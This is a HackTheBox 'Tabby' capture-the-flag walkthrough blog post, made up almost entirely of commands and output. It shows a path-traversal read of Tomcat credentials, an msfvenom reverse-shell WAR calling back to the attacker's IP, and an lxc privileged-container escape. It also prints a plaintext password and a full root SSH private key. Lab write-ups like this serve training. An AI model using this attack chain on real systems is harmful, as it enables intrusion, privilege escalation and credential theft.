---
layout: post
title:  "HackTheBox - Tabby"
date:   2020-11-07 10:10:05 +0300
categories: [HackTheBox,walkthrough]
pin: true
tags: [tomcat,msfvenom,WAR,curl,fcrackzip,lxc,ignite]
image: /images/t.png
---

- Difficulty : easy


## Credentials - View Source
```sh
view-source:http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

```sh
  <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

## Reverse Shell - MSF Venom ( WAR )
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.35 LPORT=4444 -f war > shell.war
```
## In action

#### Listener

```sh
nc -lvp 4444
```

#### Curl
```sh
curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war "http://10.10.10.194:8080/manager/text/deploy?path=/alien.war"
```
#### Execute alien.war

Web Browser

```sh
http://10.10.10.194:8080/alien.war/
```
## Target Terminal
```sh
/usr/bin/script -qc /bin/bash /dev/null
tomcat@tabby:/var/www/html/files$ python3 -m http.server 7001
```
- wget http://10.10.10.194:7001/16162020_backup.zip

## Fcrackzip
```sh
fcrackzip -D -v -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
possible pw found: admin@it
```
## User ash
```sh
su ash
password: admin@it
```
## Way to Root
```sh
lxc image list
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| oggy  | 4fce5542f83c | no     | alpine v3.12 (20200622_04:11) | i686         | CONTAINER | 3.06MB | Jun 22, 2020 at 8:26am (UTC) |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
```

```sh
lxc init oggy ignite -c security.privileged=true
```

```sh
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```
```sh
lxc start ignite
```

```sh
lxc exec ignite /bin/sh
```

```sh
cd /mnt/root/root
```
## Read the id_rsa
```sh
cat root.txt
cat /mnt/root/root/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```sh
ssh -i id_rsa_tabby root@10.10.10.194
```
